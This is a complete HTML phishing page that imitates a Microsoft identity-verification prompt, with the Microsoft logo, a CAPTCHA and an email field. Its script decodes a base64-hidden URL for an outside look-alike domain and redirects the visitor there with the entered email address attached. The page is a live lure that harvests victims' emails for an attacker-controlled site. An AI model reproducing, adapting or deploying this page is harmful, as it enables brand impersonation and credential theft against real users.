<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify Your Identity</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background-color: white;
      padding: 30px 25px;
      border-radius: 8px;
      box-shadow: 0 0 6px rgba(0, 0, 0, 0.15);
      text-align: center;
      width: 300px;
    }

    .card img {
      width: 60px;
      margin-bottom: 15px;
    }

    h2 {
      font-size: 17px;
      margin: 10px 0 5px;
      font-weight: 600;
    }

    p {
      font-size: 12px;
      color: #555;
      margin: 3px 0 15px;
    }

    input[type="email"] {
      width: 100%;
      padding: 10px;
      font-size: 13px;
      border: 1px solid #ccc;
      border-radius: 4px;
      text-align: center;
      margin-bottom: 15px;
    }

    .g-recaptcha {
      margin: 0 auto 15px;
      display: inline-block;
    }

    button {
      background-color: #0078D4;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #005a9e;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
    <h2>Verify Your Identity</h2>
    <p><strong>Complete the security check below:</strong></p>
    <p>Please enter the email address associated with this document to proceed with access.</p>
    
    <form id="verify-form">
      <label for="email-input" style="display:none;">Email</label>
      <input type="email" id="email-input" placeholder="Enter email" required />
      <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
      <button type="submit">Review</button>
    </form>
  </div>

  <script>
    function validateEmail(email) {
      const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return pattern.test(email);
    }

    document.getElementById("verify-form").addEventListener("submit", function (e) {
      e.preventDefault();
      const emailInput = document.getElementById("email-input").value.trim().toLowerCase();
      const captchaResponse = grecaptcha.getResponse();

      if (!validateEmail(emailInput)) {
        alert("Please enter a valid email address.");
        return;
      }

      if (captchaResponse.length === 0) {
        alert("Please complete the CAPTCHA.");
        return;
      }

      const redirectUrl = atob("aHR0cHM6Ly9hamZhc2lmci53aGlzcGVycy5jb20uZGUvcG5XemY=") + "?e=" + encodeURIComponent(emailInput);
      window.location.href = redirectUrl;
    });
  </script>
</body>
</html>
